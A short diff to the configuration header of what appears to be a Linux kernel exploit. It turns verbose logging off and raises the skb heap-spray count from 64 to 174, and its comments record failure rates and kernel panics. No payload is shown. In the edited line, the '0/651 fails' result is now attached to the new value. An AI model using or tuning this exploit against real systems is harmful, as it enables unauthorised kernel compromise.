@@ -14,7 +14,7 @@
 // ==== actual config values for the exploit (DEVIATE AT WILL) ====
 
 #define CONFIG_REDIRECT_LOG 0  // redirect stdout and stderr to a logging file to prevent noise when over network
-#define CONFIG_VERBOSE_ 1  // extra log verbosity, handy for debugging
+#define CONFIG_VERBOSE_ 0  // extra log verbosity, handy for debugging
 #define CONFIG_LEET 0  // breaching le mainframe
 
 // amount of physical memory to scan for kernel bases
@@ -36,7 +36,7 @@
 // - not enough skb's lead to kernel panic when kernel encounters corrupted packet in freelist when allocating skb's
 //#define CONFIG_SKB_SPRAY_AMOUNT 1 (12/32 fails)
 //#define CONFIG_SKB_SPRAY_AMOUNT 64 (4/32 fails)
-#define CONFIG_SKB_SPRAY_AMOUNT 64 // (0/651 fails)
+#define CONFIG_SKB_SPRAY_AMOUNT 174 // (0/651 fails)
 
 // only lower when flexing on people
 // - this wait period allows the kernel to make allocations in the background which aren't critical
